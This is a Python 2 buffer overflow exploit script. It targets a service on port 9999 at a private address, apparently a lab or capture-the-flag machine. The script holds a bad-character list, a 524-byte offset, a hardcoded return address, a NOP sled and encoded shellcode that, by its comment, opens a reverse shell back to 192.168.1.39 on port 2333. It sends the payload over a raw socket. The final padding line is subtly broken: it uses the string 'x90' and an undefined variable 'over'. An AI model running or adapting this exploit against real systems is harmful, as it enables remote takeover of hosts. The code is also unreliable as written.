#!/usr/bin/env python2
import socket

host = "192.168.1.40"
port = 9999

#bad: /x00
badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
        "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
        "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
        "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
        "\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
        "\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
        "\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
        "\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

#port 2333, lhost 192.168.1.39
shell = ("\xda\xce\xd9\x74\x24\xf4\xbe\x23\x5d\x9e\x68\x5d\x31\xc9\xb1"
        "\x12\x83\xed\xfc\x31\x75\x13\x03\x56\x4e\x7c\x9d\xa9\xab\x77"
        "\xbd\x9a\x08\x2b\x28\x1e\x06\x2a\x1c\x78\xd5\x2d\xce\xdd\x55"
        "\x12\x3c\x5d\xdc\x14\x47\x35\x1f\x4e\xb6\xe2\xf7\x8d\xb9\xe5"
        "\x1a\x1b\x58\x45\x42\x4b\xca\xf6\x38\x68\x65\x19\xf3\xef\x27"
        "\xb1\x62\xdf\xb4\x29\x13\x30\x14\xcb\x8a\xc7\x89\x59\x1e\x51"
        "\xac\xed\xab\xac\xaf")

#over 6500
#eip at 35724134
#offset 524
overflow = 1200
offset = 524
buf = ""
buf += "\x90" * offset
buf += "\xf3\x12\x17\x31"
buf += "\x90" * 10
buf += shell
buf += "x90" * (over - len(buf))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

print "Payload start"
s.send(buf)
print "Payload {} send".format(buf)

data = s.recv(1024)
print "Recv: {}".format(data)

print "Done"
